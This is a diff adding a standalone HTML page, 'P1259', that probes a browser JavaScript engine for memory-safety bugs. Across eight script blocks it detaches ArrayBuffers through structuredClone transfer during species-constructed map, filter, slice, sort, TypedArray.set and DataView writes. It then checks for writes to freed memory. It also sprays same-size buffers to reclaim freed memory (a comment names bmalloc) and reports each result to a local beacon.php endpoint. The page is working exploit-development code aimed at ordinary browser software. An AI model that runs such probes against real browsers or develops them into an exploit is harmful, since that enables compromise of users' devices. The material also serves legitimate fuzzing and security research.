@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1259</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1259-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1259: DETACH DURING SPECIES WRITE ===');
+B('START','P1259');
+</script>
+
+<!-- A: valueOf detaches the species Float64Array during map write -->
+<script>
+log('\n--- A: valueOf detaches buffer during map ---');
+(function(){
+  var buf=new ArrayBuffer(80);
+  var f64=new Float64Array(buf);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xAAAAAAAAAAAAAAAAn;
+
+  var detached=false;
+  var transferredBuf=null;
+
+  // Object whose valueOf detaches the Float64Array's buffer
+  var poison={
+    valueOf:function(){
+      if(!detached){
+        detached=true;
+        try{
+          transferredBuf=structuredClone(buf, {transfer:[buf]});
+        }catch(e){
+          B('A0','transfer_err:'+e.name+':'+e.message.slice(0,60));
+        }
+      }
+      return 99.99;
+    }
+  };
+
+  var arr=[1.1, 2.2, poison, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.1];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){ return f64; };
+
+  try{
+    var result=arr.map(function(x){ return x; });
+    // After map: f64's buffer was detached during the 3rd element's valueOf
+    // Did elements 4-9 write to freed memory?
+    B('A1','detached='+detached+
+      '|f64_len='+f64.length+
+      '|f64_buf_len='+f64.buffer.byteLength+
+      '|result_type='+(result instanceof Float64Array));
+
+    // Try reading from the original f64 (should be detached)
+    try{
+      var v0=f64[0];
+      B('A2','f64[0]='+v0+'|isUndef='+(v0===undefined));
+    }catch(e){B('A2','read_err:'+e.name+':'+e.message.slice(0,60));}
+
+    // Check transferred buffer for stale writes
+    if(transferredBuf){
+      var tu64=new BigUint64Array(transferredBuf);
+      var bits=[];
+      for(var i=0;i<tu64.length;i++){
+        bits.push(i+':0x'+tu64[i].toString(16));
+      }
+      B('A3','transferred='+bits.join(';'));
+    }else{
+      B('A3','no_transfer');
+    }
+  }catch(e){B('A1','map_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- B: Detach BETWEEN map callbacks using a second object -->
+<script>
+log('\n--- B: Detach between callbacks ---');
+(function(){
+  var buf=new ArrayBuffer(64);
+  var f64=new Float64Array(buf);
+
+  var callCount=0;
+  var detachPoint=3;
+  var transferredBuf=null;
+  var writeResults=[];
+
+  var arr=[1,2,3,4,5,6,7,8];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){ return f64; };
+
+  try{
+    var result=arr.map(function(x, i){
+      callCount++;
+      if(i===detachPoint && !transferredBuf){
+        try{
+          transferredBuf=structuredClone(buf, {transfer:[buf]});
+        }catch(e){
+          writeResults.push('transfer_err:'+e.name);
+        }
+      }
+      return x * 10; // Return a number (avoid valueOf complications)
+    });
+
+    B('B1','calls='+callCount+
+      '|detached='+(buf.byteLength===0)+
+      '|f64_len='+f64.length+
+      '|f64_buf='+f64.buffer.byteLength);
+
+    // Check what's in f64 after detachment
+    var fvals=[];
+    for(var i=0;i<8;i++){
+      try{ fvals.push(i+':'+f64[i]); }
+      catch(e){ fvals.push(i+':ERR'); }
+    }
+    B('B2','fvals='+fvals.join(';'));
+
+    // Check transferred buffer
+    if(transferredBuf){
+      var tu=new BigUint64Array(transferredBuf);
+      var tbits=[];
+      for(var i=0;i<tu.length;i++) tbits.push(i+':0x'+tu[i].toString(16));
+      B('B3','transferred='+tbits.join(';'));
+    }
+  }catch(e){B('B1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- C: Sort comparator that replaces array backing -->
+<script>
+log('\n--- C: Sort comparator mutation ---');
+(function(){
+  // C1: Sort comparator that replaces all elements
+  var arr=[5.5, 3.3, 1.1, 4.4, 2.2, 8.8, 6.6, 7.7];
+  var compCount=0;
+  var replaced=false;
+
+  try{
+    arr.sort(function(a,b){
+      compCount++;
+      if(compCount===3 && !replaced){
+        replaced=true;
+        // Replace array contents during sort
+        for(var i=0;i<arr.length;i++) arr[i]=100+i;
+      }
+      return a-b;
+    });
+    B('C1','sorted='+arr.join(',')+
+      '|comps='+compCount+'|replaced='+replaced);
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // C2: Sort comparator that changes array length
+  var arr2=new Array(10);
+  for(var i=0;i<10;i++) arr2[i]=(10-i)*1.1;
+  compCount=0;
+
+  try{
+    arr2.sort(function(a,b){
+      compCount++;
+      if(compCount===5){
+        arr2.length=3;
+      }
+      return a-b;
+    });
+    B('C2','len='+arr2.length+
+      '|vals='+Array.prototype.slice.call(arr2,0,Math.min(arr2.length,15)).join(',')+
+      '|comps='+compCount);
+  }catch(e){B('C2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // C3: Sort comparator that transitions array to dictionary
+  var arr3=new Array(8);
+  for(var i=0;i<8;i++) arr3[i]=(8-i)*2.2;
+  compCount=0;
+
+  try{
+    arr3.sort(function(a,b){
+      compCount++;
+      if(compCount===3){
+        // Add many named properties to force structure transition
+        for(var k=0;k<200;k++) arr3['x'+k]=k;
+        delete arr3[4]; delete arr3[5]; // Create holes
+      }
+      return a-b;
+    });
+    B('C3','len='+arr3.length+
+      '|v0='+arr3[0]+'|v1='+arr3[1]+'|v4='+arr3[4]+
+      '|comps='+compCount);
+  }catch(e){B('C3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- D: Species + structuredClone detachment for filter/slice -->
+<script>
+log('\n--- D: Detach during filter/slice ---');
+(function(){
+  // D1: filter with species→Float64Array, detach during predicate
+  var buf=new ArrayBuffer(80);
+  var f64=new Float64Array(buf);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xBBBBBBBBBBBBBBBBn;
+
+  var detached=false;
+  var arr=[1,2,3,4,5,6,7,8,9,10];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){ return f64; };
+
+  try{
+    var result=arr.filter(function(x,i){
+      if(i===3 && !detached){
+        detached=true;
+        try{ structuredClone(buf,{transfer:[buf]}); }catch(e){}
+      }
+      return x>3; // Keep elements 4-10
+    });
+    B('D1','detached='+detached+
+      '|result_len='+result.length+
+      '|f64_buf='+f64.buffer.byteLength+
+      '|isTA='+(result instanceof Float64Array));
+
+    // Read f64
+    var fv=[];
+    for(var i=0;i<10;i++){
+      try{fv.push(i+':'+f64[i]);}catch(e){fv.push(i+':ERR');}
+    }
+    B('D2','fvals='+fv.join(';'));
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // D3: slice with species→plain object, mutate during slice
+  var arr2=[10,20,30,40,50,60,70,80];
+  arr2.constructor={};
+  var sliceObj={};
+  arr2.constructor[Symbol.species]=function(len){
+    sliceObj={length:len};
+    return sliceObj;
+  };
+
+  // Add getter to source array
+  Object.defineProperty(arr2, "3", {
+    get:function(){
+      // Modify the species result during slice!
+      sliceObj.extraProp='INJECTED';
+      sliceObj.__proto__=null; // Nuke prototype
+      return 40;
+    },
+    configurable:true, enumerable:true
+  });
+
+  try{
+    var result2=arr2.slice(1,6);
+    B('D3','v0='+result2[0]+'|v1='+result2[1]+'|v2='+result2[2]+
+      '|extra='+result2.extraProp+
+      '|proto='+(result2.__proto__===null)+
+      '|len='+result2.length);
+  }catch(e){B('D3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- E: Re-entrant valueOf that swaps the TypedArray's buffer -->
+<script>
+log('\n--- E: valueOf buffer swap ---');
+(function(){
+  // Create two buffers with different sentinels
+  var buf1=new ArrayBuffer(64);
+  var buf2=new ArrayBuffer(64);
+  var u1=new BigUint64Array(buf1);
+  var u2=new BigUint64Array(buf2);
+  for(var i=0;i<u1.length;i++) u1[i]=0x1111111111111111n;
+  for(var i=0;i<u2.length;i++) u2[i]=0x2222222222222222n;
+
+  var f64=new Float64Array(buf1);
+  var swapped=false;
+
+  // Map callback that returns an object whose valueOf swaps buffers
+  var arr=[1,2,3,4,5,6,7,8];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=function(len){ return f64; };
+
+  try{
+    var result=arr.map(function(x,i){
+      if(i===4){
+        // After writing indices 0-3 to buf1, try to make f64 point at buf2
+        // We can't swap buffers in JS... but what if we detach buf1 and
+        // allocate buf2 at the same address?
+        try{
+          var transferred=structuredClone(buf1, {transfer:[buf1]});
+          // buf1 is now detached. Allocate buf2 in its place (LIFO bmalloc)
+          // Actually buf2 already exists... let's allocate many buffers
+          // of the same size to try to reclaim buf1's memory
+          var reclaimBufs=[];
+          for(var j=0;j<50;j++){
+            var rb=new ArrayBuffer(64);
+            var rv=new BigUint64Array(rb);
+            for(var k=0;k<rv.length;k++) rv[k]=0x4242424242424242n;
+            reclaimBufs.push(rb);
+          }
+        }catch(e){}
+      }
+      return x*100;
+    });
+
+    // Check f64 — is it still alive? What did it write?
+    var fv=[];
+    for(var i=0;i<8;i++){
+      try{fv.push(i+':'+f64[i]);}catch(e){fv.push(i+':ERR');}
+    }
+    B('E1','buf1_detached='+(buf1.byteLength===0)+
+      '|f64_buf='+f64.buffer.byteLength+
+      '|fvals='+fv.join(';'));
+
+    // Check if any reclaim buffers got the writes
+    var reclaimHits=[];
+    if(typeof reclaimBufs!=='undefined'){
+      for(var j=0;j<reclaimBufs.length;j++){
+        var rv=new BigUint64Array(reclaimBufs[j]);
+        for(var k=0;k<rv.length;k++){
+          if(rv[k]!==0x4242424242424242n){
+            reclaimHits.push('b'+j+'['+k+']=0x'+rv[k].toString(16));
+          }
+        }
+      }
+    }
+    B('E2','reclaim_hits='+reclaimHits.length+
+      '|data='+reclaimHits.slice(0,5).join(';'));
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- F: Detach TypedArray source during Array.from -->
+<script>
+log('\n--- F: Detach TA during Array.from ---');
+(function(){
+  // If Array.from reads from a TypedArray and we detach it mid-iteration...
+  var buf=new ArrayBuffer(80);
+  var f64=new Float64Array(buf);
+  for(var i=0;i<10;i++) f64[i]=(i+1)*1.1;
+
+  var readValues=[];
+  var detached=false;
+
+  // Use getter on array-like wrapper
+  var wrapper={length:10};
+  for(var i=0;i<10;i++){
+    (function(idx){
+      Object.defineProperty(wrapper, String(idx), {
+        get:function(){
+          if(idx===3 && !detached){
+            detached=true;
+            try{structuredClone(buf,{transfer:[buf]});}catch(e){}
+          }
+          var v=f64[idx];
+          readValues.push(idx+':'+v);
+          return v;
+        },
+        enumerable:true, configurable:true
+      });
+    })(i);
+  }
+
+  try{
+    var result=Array.from(wrapper);
+    B('F1','len='+result.length+
+      '|reads='+readValues.join(';'));
+  }catch(e){B('F1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Direct TypedArray as source for Array.from with detach in mapFn
+  var buf2=new ArrayBuffer(40);
+  var f64_2=new Float64Array(buf2);
+  for(var i=0;i<5;i++) f64_2[i]=(i+1)*2.2;
+  var detached2=false;
+
+  try{
+    var result2=Array.from(f64_2, function(x,i){
+      if(i===2 && !detached2){
+        detached2=true;
+        try{structuredClone(buf2,{transfer:[buf2]});}catch(e){}
+      }
+      return x;
+    });
+    B('F2','len='+result2.length+
+      '|v0='+result2[0]+'|v2='+result2[2]+
+      '|v3='+result2[3]+'|v4='+result2[4]+
+      '|detached='+(buf2.byteLength===0));
+  }catch(e){B('F2','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- G: TypedArray.set with detachment during valueOf -->
+<script>
+log('\n--- G: TypedArray.set with detach ---');
+(function(){
+  var buf=new ArrayBuffer(64);
+  var f64=new Float64Array(buf);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xCCCCCCCCCCCCCCCCn;
+
+  // Create array-like with valueOf that detaches on element 3
+  var src=[];
+  for(var i=0;i<8;i++){
+    if(i===3){
+      src.push({
+        valueOf:function(){
+          try{structuredClone(buf,{transfer:[buf]});}catch(e){}
+          return 333.333;
+        }
+      });
+    }else{
+      src.push(i*11.1);
+    }
+  }
+
+  try{
+    f64.set(src);
+    // Did elements 4-7 write to freed memory?
+    B('G1','buf_detached='+(buf.byteLength===0)+
+      '|f64_buf='+f64.buffer.byteLength);
+
+    var fv=[];
+    for(var i=0;i<8;i++){
+      try{fv.push(i+':'+f64[i]);}catch(e){fv.push(i+':ERR');}
+    }
+    B('G2','fvals='+fv.join(';'));
+  }catch(e){B('G1','err:'+e.name+':'+e.message.slice(0,80));}
+
+  // Same but with Uint32Array and integer values
+  var buf3=new ArrayBuffer(32);
+  var u32=new Uint32Array(buf3);
+  for(var i=0;i<u32.length;i++) u32[i]=0xEEEEEEEE;
+
+  var src2=[];
+  for(var i=0;i<8;i++){
+    if(i===2){
+      src2.push({valueOf:function(){
+        try{structuredClone(buf3,{transfer:[buf3]});}catch(e){}
+        return 0xDEAD;
+      }});
+    }else{
+      src2.push(i*0x1111);
+    }
+  }
+
+  try{
+    u32.set(src2);
+    B('G3','buf3_det='+(buf3.byteLength===0)+
+      '|u32_buf='+u32.buffer.byteLength);
+    var uv=[];
+    for(var i=0;i<8;i++){
+      try{uv.push(i+':0x'+u32[i].toString(16));}catch(e){uv.push(i+':ERR');}
+    }
+    B('G4','uvals='+uv.join(';'));
+  }catch(e){B('G3','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- H: DataView.setFloat64 with detach in valueOf -->
+<script>
+log('\n--- H: DataView detach during set ---');
+(function(){
+  var buf=new ArrayBuffer(64);
+  var dv=new DataView(buf);
+  var u64=new BigUint64Array(buf);
+  for(var i=0;i<u64.length;i++) u64[i]=0xDDDDDDDDDDDDDDDDn;
+
+  // Write 3 values, detach during the 2nd
+  try{
+    dv.setFloat64(0, 1.1);
+    B('H1a','wrote_0=ok|u64_0=0x'+u64[0].toString(16));
+  }catch(e){B('H1a','err:'+e.name);}
+
+  try{
+    dv.setFloat64(8, {valueOf:function(){
+      structuredClone(buf,{transfer:[buf]});
+      return 2.2;
+    }});
+    B('H1b','wrote_1=ok|det='+(buf.byteLength===0));
+  }catch(e){B('H1b','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Now try writing to offset 16 — buffer should be detached
+  try{
+    dv.setFloat64(16, 3.3);
+    B('H1c','wrote_2=ok_VULN!');
+  }catch(e){B('H1c','write_after_det:'+e.name);}
+
+  // Check: does getFloat64 work on detached?
+  try{
+    var v=dv.getFloat64(0);
+    B('H1d','read_det='+v);
+  }catch(e){B('H1d','read_after_det:'+e.name);}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1259 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
